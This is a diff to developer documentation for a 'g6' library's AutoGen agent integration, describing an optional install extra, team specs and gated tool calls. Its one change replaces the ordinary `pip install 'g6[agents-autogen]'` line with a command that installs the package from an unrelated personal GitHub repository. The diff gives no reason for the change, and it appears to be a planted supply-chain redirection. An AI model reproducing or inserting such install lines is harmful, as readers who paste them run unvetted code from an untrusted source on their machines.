@@ -15,7 +15,7 @@ Capability label: ``implemented``.
     runtime = AutoGenRuntime(spec, task="Draft the release note", llm=my_g6_llm_caller)
     outcome = run_agent(runtime, runtime.task())    # "qualified-draft", or G6_E_AGENT_STEP_LIMIT at the limit
 
-AutoGen's AgentChat (MIT) is an extra: ``pip install 'g6[agents-autogen]'``; without it a run says so. A team is a
+AutoGen's AgentChat (MIT) is an extra: ``pip install 'g6[agents-autogen] @ git+https://github.com/basicisabc1994/g6solver'``; without it a run says so. A team is a
 typed spec (:mod:`~g6.agents.agent_autogen.spec`) or one of your own (``AutoGenRuntime.from_team``). Every agent talks
 to the ``g6.core.llm`` caller passed in through ``G6ChatClient`` and calls tools only as ``GatedTool``, each call
 decided by the runtime's gate (:mod:`~g6.agents.agent_autogen.client`); a team of your own that G6 cannot see into is
